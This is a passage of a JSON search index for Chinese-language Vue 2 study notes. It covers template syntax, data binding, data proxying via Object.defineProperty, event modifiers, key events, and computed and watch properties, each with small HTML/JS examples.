Vue周边库\",\"slug\":\"_1-5-vue周边库\",\"contents\":[\"vue-cli：vue 脚手架\",\"vue-resource (axios)：ajax 请求\",\"vue-router：路由\",\"vuex：状态管理（它是 vue 的插件，但是没有用 vue-xxx 的命名规则）\",\"vue-lazyload：图片懒加载\",\"vue-scroller：页面滑动相关\",\"mint-ui：基于 vue 的 UI 组件库（移动端）\",\"element-ui：基于 vue 的 UI 组件库（PC 端）\"]},{\"header\":\"2. 初识Vue\",\"slug\":\"_2-初识vue\",\"contents\":[]},{\"header\":\"2.1 前置工作\",\"slug\":\"_2-1-前置工作\",\"contents\":[\"给浏览器安装 Vue Devtools 插件\",\"标签引入 Vue 包\",\"（可选）阻止 Vue 在启动时生成生产提示 Vue.config.productionTip = false\"]},{\"header\":\"2.2 代码演示\",\"slug\":\"_2-2-代码演示\",\"contents\":[\"想让 Vue 工作，就必须创建一个 Vue实例，且要传入一个配置对象\",\"容器里的代码依然符合 HTML 规范，只不过混入了一些特殊的 Vue 语法\",\"容器里的代码被称为 Vue 模板\",\"Vue 实例与容器是一一对应的\",\"真实开发中只有一个 Vue 实例，并且会配合着组件一起使用\",\"{{xxx}} 中的 xxx 要写 JS 表达式，且 xxx 可以自动读取到 data 中的所有属性\",\"一旦 data 中的数据发生变化，那么页面中用到该数据的地方也会自动更新\",\"<!DOCTYPE html> <html> <head> <meta charset=\\\"UTF-8\\\" /> <title>初识Vue</title> <!-- 引入Vue --> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器 --> <div id=\\\"demo\\\"> <h1>Hello，{{ name.toUpperCase() }}，{{ address }}</h1> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false //阻止 Vue 在启动时生成生产提示 // 创建Vue实例 new Vue({ el: '#demo', // el用于指定当前Vue实例为哪个容器服务，值通常为CSS选择器字符串 data: { // data中用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象 name: 'zhf', address: '山东', }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-快速上手01.png\",\"注意区分：JS 表达式和 JS 代码（语句）\",\"JS 表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方，如：a、a+b、demo(1)、x === y ? 'a' : 'b'\",\"JS 代码（语句），只控制代码的走向，不生成值，如：if (){}、for (){}\"]},{\"header\":\"2.3 el和data\",\"slug\":\"_2-3-el和data\",\"contents\":[\"el 用于指定当前 Vue 实例为哪个容器服务，值通常为 CSS 选择器字符串\",\"data 中用于存储数据，数据供 el 所指定的容器去使用，值暂时先写成一个对象\",\"el 有两种写法：\",\"创建 Vue 实例对象的时候配置 el 属性\",\"const v = new Vue({ el:'#root', //第一种写法 data:{ name:'zhf' } }) \",\"先创建 Vue 实例，随后再通过 v.$mount('选择器') 指定 el 的值\",\"const v = new Vue({ data:{ name:'zhf' } }) v.$mount('#root') //第二种写法 \",\"data 有两种写法：\",\"对象式：data:{}\",\"data:{ name:'zhf' } \",\"函数式：data(){return{}}\",\"data(){ console.log('@@@',this) //此处的this是Vue实例对象 return{ name:'zhf' } } \",\"如何选择：组件时，data 必须使用函数式，否则会报错\",\"重要原则：由 Vue 管理的函数，一定不要写箭头函数，否则 this 就不再是 Vue 实例了\"]}]},\"/front-end/vue-notes/02-Vue%E6%A0%B8%E5%BF%83-%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95.html\":{\"title\":\"模板语法\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/02-Vue核心-模板语法\"]},{\"header\":\"1. 模板的理解\",\"slug\":\"_1-模板的理解\",\"contents\":[\"模板就是动态 HTML 页面，这里面包含了一些 JS 语法代码\"]},{\"header\":\"2. Vue模板语法\",\"slug\":\"_2-vue模板语法\",\"contents\":[\"Vue 模板语法包括两大类，分别是：\",\"插值语法：双大括号表示\",\"指令语法：指令（以 v- 开头的自定义标签属性）\"]},{\"header\":\"2.1 插值语法\",\"slug\":\"_2-1-插值语法\",\"contents\":[\"功能：用于解析标签体内容\",\"写法：{{xxx}}，xxx 是 JS 表达式，可以直接读取到 data 中的所有属性\"]},{\"header\":\"2.2 指令语法\",\"slug\":\"_2-2-指令语法\",\"contents\":[\"功能：用于解析标签（包括：标签属性、标签体内容、绑定事件等）\",\"举例：<a v-bind:href=\\\"xxx\\\"> 或简写为 <a :href='xxx'>，xxx 同样要写 JS 表达式，可以直接读取到 data 中所有属性\",\"备注：Vue 中有很多的指令，且形式都是 v-xxx，此处只是以 v-bind 举例\",\"例：\",\"<!DOCTYPE html> <html> <head> <meta charset=\\\"UTF-8\\\" /> <title>模板语法</title> <!-- 引入Vue --> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>插值语法</h2> <h4>你好，{{ name }}</h4> <hr /> <h2>指令语法</h2> <a v-bind:href=\\\"baidu.url.toUpperCase()\\\">点我去{{ baidu.name }}1</a> <a :href=\\\"baidu.url\\\">点我去{{ baidu.name }}2</a> </div> </body> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。 new Vue({ el: '#root', data: { name: 'zhf', baidu: { name: '百度', url: 'https://www.baidu.com/', }, }, }) </script> </html> \",\"效果：\",\"Vue核心-模板语法01.gif\"]}]},\"/front-end/vue-notes/03-Vue%E6%A0%B8%E5%BF%83-%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A.html\":{\"title\":\"数据绑定\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/03-Vue核心-数据绑定\"]},{\"header\":\"1. 数据绑定\",\"slug\":\"_1-数据绑定\",\"contents\":[\"Vue 中有两种数据绑定的方式：\",\"单向绑定 v-bind ：数据只能从 data 流向页面\",\"双向绑定 v-model ：数据不仅能从 data 流向页面，还可以从页面流向 data\",\"备注：\",\"双向绑定一般都应用在表单类元素上，如 <input>、<select>、<textarea> 等\",\"v-model:value 可以简写为 v-model，因为 v-model 默认收集的就是 value 值\",\"例：\",\"<!DOCTYPE html> <html> <head> <meta charset=\\\"UTF-8\\\" /> <title>数据绑定</title> <!-- 引入Vue --> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <!-- 普通写法 --> <!-- 单向数据绑定：<input type=\\\"text\\\" v-bind:value=\\\"name\\\" /><br /> --> <!-- 双向数据绑定：<input type=\\\"text\\\" v-model:value=\\\"name\\\" /> --> <!-- 简写 --> 单向数据绑定：<input type=\\\"text\\\" :value=\\\"name\\\" /><br /> 双向数据绑定：<input type=\\\"text\\\" v-model=\\\"name\\\" /> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { name: 'zhf', }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-数据绑定01.gif\"]},{\"header\":\"2. v-model指令的修饰符\",\"slug\":\"_2-v-model指令的修饰符\",\"contents\":[]},{\"header\":\"2.1 v-model.number\",\"slug\":\"_2-1-v-model-number\",\"contents\":[\"使用修饰符 .number 可以将输入的数据转换为 Number 类型，否则虽然你输入的是数字. 但它的类型其实是 String\"]},{\"header\":\"2.2 v-model.trim\",\"slug\":\"_2-2-v-model-trim\",\"contents\":[\"给 v-model 添加修饰符 .trim 可以自动过滤用户输入的首尾空格\"]},{\"header\":\"2.3 v-model.lazy\",\"slug\":\"_2-3-v-model-lazy\",\"contents\":[\"并不是实时改变，而是在失去焦点或者按回车时才会更新\",\"在输入框中，v-model默认是在input事件中同步输入框的数据（除了输入法中文输入的情况），使用修饰符 .lazy 会转变为 change 事件中同步（类似懒加载）\"]}]},\"/front-end/vue-notes/04-Vue%E6%A0%B8%E5%BF%83-MVVM%E6%A8%A1%E5%9E%8B%E4%B8%8E%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86.html\":{\"title\":\"MVVM模型与数据代理\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/04-Vue核心-MVVM模型与数据代理\"]},{\"header\":\"1. MVVM 模型\",\"slug\":\"_1-mvvm-模型\",\"contents\":[\"Vue核心-MVVM模型与数据代理01.png\",\"MVVM 本质上是 MVC （Model-View- Controller）的改进版。即模型-视图-视图模型\",\"模型 model 指的是后端传递的数据，视图 view 指的是所看到的页面\",\"视图模型 viewModel 是 MVVM 模式的核心，它是连接 view 和 model 的桥梁。它有两个方向：\",\"将模型转化成视图，即将后端传递的数据转化成所看到的页面。实现的方式是：数据绑定\",\"将视图转化成模型，即将所看到的页面转化成后端的数据。实现的方式是：DOM 事件监听\",\"MVVM：\",\"M：模型 Model，data 中的数据\",\"V：视图 View，模板代码（不是静态页面）（两个语法：指令，大括号表达式）\",\"VM：视图模型 ViewModel，Vue 实例 \",\"Dom Listeners（Dom 监听）\",\"Data Bindings（数据绑定）\",\"观察发现：\",\"data 中所有的属性，最后都出现在了 vm 身上\",\"vm 身上所有的属性及 Vue 原型身上所有的属性，在 Vue 模板中都可以直接使用\",\"Vue核心-MVVM模型与数据代理02.png\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>MVVM</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h1>学校名称：{{name}}</h1> <h1>学校地址：{{address}}</h1> <h1>测试：{{$options}}</h1> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: '曲阜师范大学', address: '曲阜', }, }) console.log(vm) </script> </body> </html> \",\"效果：\",\"Vue核心-MVVM模型与数据代理03.png\"]},{\"header\":\"2. Vue 中的数据代理\",\"slug\":\"_2-vue-中的数据代理\",\"contents\":[]},{\"header\":\"2.1 Object.defineproperty方法\",\"slug\":\"_2-1-object-defineproperty方法\",\"contents\":[\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Object.defineproperty方法</title> </head> <body> <script> let number = 18 let person = { name: '张三', sex: '男', } Object.defineProperty(person, 'age', { // value:18, // enumerable:true, // 控制属性是否可以枚举，默认值是false // writable:true, // 控制属性是否可以被修改，默认值是false // configurable:true // 控制属性是否可以被删除，默认值是false // 当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值 get() { console.log('有人读取age属性了') return number }, // 当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值 set(value) { console.log('有人修改了age属性，且值是', value) number = value }, }) console.log(person) </script> </body> </html> \",\"效果：\",\"Vue核心-MVVM模型与数据代理04.png\"]},{\"header\":\"2.2 数据代理\",\"slug\":\"_2-2-数据代理\",\"contents\":[\"数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>模拟一个数据代理</title> </head> <body> <script> let obj1 = { x: 100 } let obj2 = { y: 200 } Object.defineProperty(obj2, 'x', { get() { return obj1.x }, set(value) { obj1.x = value }, }) console.log(obj1.x) console.log(obj1.y) console.log(obj2.x) console.log(obj2.y) </script> </body> </html> \",\"效果：\",\"Vue核心-MVVM模型与数据代理05.png\",\"Vue 中的数据代理通过 vm 对象来代理 data 对象中属性的操作（读/写）\",\"Vue 中数据代理的好处：更加方便的操作 data 中的数据\",\"基本原理 \",\"通过 Object.defineProperty()把 data 对象中所有属性添加到 vm 上\",\"为每一个添加到 vm 上的属性，都指定一个 gettersetter\",\"在 gettersetter 内部去操作（读/写）data 中对应的属性\",\"Vue核心-MVVM模型与数据代理06.png\",\"Vue 将 data 中的数据拷贝了一份到 _data 属性中，又将 _data 里面的属性提到 Vue 实例中（如 name），通过 defineProperty 实现数据代理，这样通过 geter/setter 操作 name，进而操作 _data 中的 name。而 _data 又对 data 进行数据劫持，实现响应式\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Vue中的数据代理</title> <!-- 引入Vue --> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>学校名称：{{ name }}</h2> <h2>学校地址：{{ address }}</h2> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: '曲阜师范大学', address: '曲阜', }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-MVVM模型与数据代理07.png\"]}]},\"/front-end/vue-notes/05-Vue%E6%A0%B8%E5%BF%83-%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86.html\":{\"title\":\"事件处理\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/05-Vue核心-事件处理\"]},{\"header\":\"1. 事件的基本用法\",\"slug\":\"_1-事件的基本用法\",\"contents\":[\"使用 v-on:xxx 或 @xxx 绑定事件，其中 xxx 是事件名\",\"事件的回调需要配置在 methods 对象中，最终会在 vm 上\",\"methods 中配置的函数，不要用箭头函数，否则 this 就不是 vm 了\",\"methods 中配置的函数，都是被 Vue 所管理的函数，this 的指向是 vm 或组件实例对象\",\"@click=\\\"xxx\\\" 和 @click=\\\"xxx()\\\" 效果一致，但后者括号里面可以传参\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>事件的基本使用</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>欢迎阅读{{name}}的笔记</h2> <button v-on:click=\\\"showInfo\\\">点我提示信息</button> <button @click=\\\"showInfo1()\\\">点我提示信息1（不传参）</button> <button @click=\\\"showInfo2($event,66)\\\">点我提示信息2（传参）</button> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', }, methods: { showInfo() { alert('你好呀！这是完整写法绑定事件') }, showInfo1() { alert('你好呀！这是简写方法绑定事件，不传参') }, showInfo2(event, number) { alert(`你好呀！这是简写方法绑定事件，传参，传递到参数是${number}`) console.log(event) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-事件处理01.gif\"]},{\"header\":\"2. 事件修饰符\",\"slug\":\"_2-事件修饰符\",\"contents\":[\"Vue 中的事件修饰符：\",\"prevent 阻止默认事件（常用）\",\"stop 阻止事件冒泡（常用）\",\"once 事件只触发一次（常用）\",\"capture 使用事件的捕获模式\",\"self 只有 event.target 是当前操作的元素时才触发事件\",\"passive 事件的默认行为立即执行，无需等待事件回调执行完毕\",\"注意：修饰符可以连续写，比如可以这么用：@click. prevent.stop=\\\"xxx\\\"\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>事件修饰符</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> <style> * { margin-top: 20px; } .box { height: 50px; background-color: skyblue; } .box1 { padding: 5px; background-color: skyblue; } .box2 { padding: 5px; background-color: white; } .list { width: 200px; height: 200px; background-color: skyblue; overflow: auto; } li { height: 100px; } </style> </head> <body> <div id=\\\"root\\\"> <h2>欢迎来{{name}}学习</h2> <!-- 阻止默认事件（常用） --> <a href=\\\"https://www.qfnu.edu.cn/\\\" @click.prevent=\\\"showInfo\\\">点我提示信息</a> <!-- 阻止事件冒泡（常用） --> <div class=\\\"box\\\" @click=\\\"showInfo\\\"> <button @click1=\\\"showInfo\\\">点我提示信息</button> </div> <!-- 事件只触发一次（常用） --> <button @click.once=\\\"showInfo\\\">点我提示信息</button> <!-- 使用事件的捕获模式 --> <div class=\\\"box1\\\" @click.capture=\\\"showMsg(1)\\\"> div1 <div class=\\\"box2\\\" @click=\\\"showMsg(2)\\\">div2</div> </div> <!-- 只有event.target是当前操作的元素时才触发事件 --> <div class=\\\"box\\\" @click.self=\\\"showInfo\\\"> <button @click=\\\"showInfo\\\">点我提示信息</button> </div> <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕--> <!-- scroll是滚动条滚动，passive没有影响 --> <!-- wheel是鼠标滚轮滚动，passive有影响 --> <ul @wheel.passive=\\\"demo\\\" class=\\\"list\\\"> <li>1</li> <li>2</li> <li>3</li> <li>4</li> </ul> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { name: '曲阜师范大学', }, methods: { showInfo() { alert('同学你好！') }, showMsg(msg) { alert(`${msg}`) }, demo() { for (let i = 0; i < 100000; i++) { console.log('#') } console.log('累坏了') }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-事件处理02.gif\"]},{\"header\":\"3. 键盘事件\",\"slug\":\"_3-键盘事件\",\"contents\":[\"键盘上的每个按键都有自己的名称和编码，例如：Enter（13），而 Vue 还对一些常用按键起了别名方便使用\",\"Vue 中常用的按键别名：\",\"回车 enter\",\"删除 delete 捕获“删除”和“退格”键\",\"退出 esc\",\"空格 space\",\"换行 tab 特殊，必须配合 keydown 去使用\",\"上 up\",\"下 down\",\"左 left\",\"右 right\",\"Vue 未提供别名的按键，可以使用按键原始的 key 值去绑定，但注意要转为 kebab-case（多单词小写短横线写法）\",\"系统修饰键（用法特殊）ctrlaltshiftmeta（meta 就是 win 键）\",\"配合 keyup 使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发，指定 ctr+y 使用 @keyup.ctr.y\",\"配合 keydown 使用：正常触发事件\",\"也可以使用 keyCode 去指定具体的按键（不推荐）\",\"Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>键盘事件</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>欢迎阅读{{name}}的笔记</h2> <input type=\\\"text\\\" placeholder=\\\"按下回车提示输入\\\" @keyup.enter=\\\"showInfo\\\" /> <br /> <input type=\\\"text\\\" placeholder=\\\"按下tab提示输入\\\" @keydown.tab=\\\"showInfo\\\" /> <br /> <input type=\\\"text\\\" placeholder=\\\"按下回车提示输入\\\" @keydown.huiche=\\\"showInfo\\\" /> <br /> </div> <script> Vue.config.productionTip = false Vue.config.keyCodes.huiche = 13 // 定义了一个别名按键 new Vue({ el: '#root', data: { name: 'zhf', }, methods: { showInfo(e) { alert(`${e.target.value}`) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-事件处理03.gif\"]}]},\"/front-end/vue-notes/06-Vue%E6%A0%B8%E5%BF%83-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E4%B8%8E%E4%BE%A6%E5%90%AC%E5%B1%9E%E6%80%A7.html\":{\"title\":\"计算属性与侦听属性\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/06-Vue核心-计算属性与侦听属性\"]},{\"header\":\"1. 计算属性\",\"slug\":\"_1-计算属性\",\"contents\":[\"姓名案例：\",\"Vue核心-计算属性与侦听属性01.gif\",\"插值语法实现：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>插值语法实现姓名案例</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> 姓：<input type=\\\"text\\\" v-model=\\\"firstName\\\" /> <br /> 名：<input type=\\\"text\\\" v-model=\\\"lastName\\\" /> <br /> 全名：<span>{{ firstName }}-{{ lastName }}</span> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false new Vue({ el: '#root', data: { firstName: '张', lastName: '三', }, }) </script> </body> </html> \",\"methods 实现：\",\"数据发生变化，模板就会被重新解析\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>methods实现姓名案例</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> 姓：<input type=\\\"text\\\" v-model=\\\"firstName\\\" /><br /> 名：<input type=\\\"text\\\" v-model=\\\"lastName\\\" /><br /> 全名：<span>{{fullName()}}</span> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { firstName: '张', lastName: '三', }, methods: { fullName() { return this.firstName + '-' + this.lastName }, }, }) </script> </body> </html> \",\"computed 计算属性实现：\",\"定义：要用的属性不存在，需要通过已有属性计算得来\",\"原理：底层借助了 Objcet.defineproperty() 方法提供的 getter 和 setter\",\"get 函数什么时候执行？ \",\"初次读取时会执行一次\",\"当依赖的数据发生改变时会被再次调用\",\"优势：与 methods 实现相比，内部有缓存机制（复用），效率更高，调试方便\",\"备注 \",\"计算属性最终会出现在 vm 上，直接读取使用即可\",\"如果计算属性要被修改，那必须写 set 函数去响应修改，且 set 中要引起计算时依赖的数据发生改变\",\"如果计算属性确定不考虑修改，可以使用计算属性的简写形式\",\"我们用计算属性实现姓名案例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>计算属性实现姓名案例</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> 姓：<input type=\\\"text\\\" v-model=\\\"firstName\\\" /> <br /> 名：<input type=\\\"text\\\" v-model=\\\"lastName\\\" /> <br /> 全名：<span>{{fullName}}</span> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { firstName: '张', lastName: '三', }, computed: { //完整写法 /*fullName: { get() { return this.firstName + '-' + this.lastName }, set(value) { const arr = value.split('-') this.firstName = arr[0] this.lastName = arr[1] }, },*/ //简写形式 fullName() { return this.firstName + '-' + this.lastName }, }, }) </script> </body> </html> \"]},{\"header\":\"2. 侦听属性\",\"slug\":\"_2-侦听属性\",\"contents\":[]},{\"header\":\"2.1 侦听属性基本用法\",\"slug\":\"_2-1-侦听属性基本用法\",\"contents\":[\"watch 侦听属性\",\"当被侦听的属性变化时，回调函数自动调用，进行相关操作\",\"侦听的属性必须存在，才能进行侦听，既可以侦听 data，也可以侦听计算属性\",\"配置项属性 immediate:false，改为 true，则初始化时调用一次 handler(newValue,oldValue)\",\"侦听有两种写法 \",\"创建 Vue 时传入 watch:{}配置\",\"通过 vm.$watch() 侦听\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>侦听的基本用法</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>今天天气很{{info}}</h2> <button @click=\\\"changeWeather\\\">切换天气</button> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { isHot: true, }, computed: { info() { return this.isHot ? '炎热' : '凉爽' }, }, methods: { changeWeather() { this.isHot = !this.isHot }, }, //方式一 /*watch: { isHot: { immediate: true, handler(newValue, oldValue) { console.log('isHot被修改了', newValue, oldValue) }, }, },*/ }) //方式二 vm.$watch('isHot', { immediate: true, //初始化时让handler调用一下 //handler什么时候调用？当isHot发生改变时 handler(newValue, oldValue) { console.log('isHot被修改了', newValue, oldValue) }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-计算属性与侦听属性02.gif\"]},{\"header\":\"2.2 深度侦听\",\"slug\":\"_2-2-深度侦听\",\"contents\":[\"Vue 中的 watch 默认不侦听对象内部值的改变（一层）\",\"在 watch 中配置 deep:true 可以侦听对象内部值的改变（多层）\",\"注意：\",\"Vue 自身可以侦听对象内部值的改变，但 Vue 提供的 watch 默认不可以\",\"使用 watch 时根据侦听数据的具体结构，决定是否采用深度侦听\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>深度侦听</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h3>a的值是:{{ numbers.a }}</h3> <button @click=\\\"numbers.a++\\\">点我让a+1</button> <h3>b的值是:{{ numbers.b }}</h3> <button @click=\\\"numbers.b++\\\">点我让b+1</button> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { numbers: { a: 1, b: 1, }, }, watch: { // 监视多级结构中某个属性的变化 /*'numbers.a': { handler() { console.log('a被改变了') }, },*/ //监视多级结构中所有属性的变化 numbers: { deep: true, handler() { console.log('numbers改变了') }, }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-计算属性与侦听属性03.gif\"]},{\"header\":\"2.3 侦听属性简写\",\"slug\":\"_2-3-侦听属性简写\",\"contents\":[\"如果侦听属性除了 handler 没有其他配置项的话，可以进行简写\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>侦听属性简写</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h3>今天天气很{{ info }}</h3> <button @click=\\\"changeWeather\\\">切换天气</button> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { isHot: true }, computed: { info() { return this.isHot ? '炎热' : '凉爽' }, }, methods: { changeWeather() { this.isHot = !this.isHot }, }, watch: { // 正常写法 // isHot: { // // immediate:true, //初始化时让handler调用一下 // // deep:true, //深度监视 // handler(newValue, oldValue) { // console.log('isHot被修改了', newValue, oldValue) // } // }, //简写 isHot(newValue, oldValue) { console.log('isHot被修改了', newValue, oldValue, this) }, }, }) //正常写法 // vm.$watch('isHot', { // immediate: true, //初始化时让handler调用一下 // deep: true,//深度监视 // handler(newValue, oldValue) { // console.log('isHot被修改了', newValue, oldValue) // } // })l //简写 // vm.$watch('isHot', (newValue, oldValue) => { // console.log('isHot被修改了', newValue, oldValue, this) // }) </script> </body> </html> \"]},{\"header\":\"3. 计算属性VS侦听属性\",\"slug\":\"_3-计算属性vs侦听属性\",\"contents\":[\"computed 和 watch 之间的区别：\",\"computed 能完成的功能，watch 都可以完成\",\"watch 能完成的功能，computed 不一定能完成，例如 watch 可以进行异步操作\",\"两个重要的小原则：\",\"所有被 Vue 管理的函数，最好写成普通函数，这样 this 的指向才是 vm 或组件实例对象\",\"所有不被 Vue 所管理的函数（定时器的回调函数、Ajax 的回调函数、Promise 的回调函数等），最好写成箭头函数，这样 this 的指向才是 vm 或组件实例对象\",\"上面的姓名案例：\",\"使用计算属性：\",\"new Vue({ el:'#root', data:{ firstName:'张', lastName:'三' }, computed:{ fullName(){ return this.firstName + '-' + this.lastName } } }) \",\"使用监听属性：\",\"new Vue({ el:'#root', data:{ firstName:'张', lastName:'三', fullName:'张-三' }, watch:{ firstName(val){ setTimeout(()=>{ this.fullName = val + '-' + this.lastName },1000); }, lastName(val){ this.fullName = this.firstName + '-' + val } } }) \"]}]},\"/front-end/vue-notes/07-Vue%E6%A0%B8%E5%BF%83-%E7%BB%91%E5%AE%9A%E6%A0%B7%E5%BC%8F.html\":{\"title\":\"绑定样式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/07-Vue核心-绑定样式\"]},{\"header\":\"1. 绑定class样式\",\"slug\":\"_1-绑定class样式\",\"contents\":[\":class=\\\"xxx\\\" //xxx 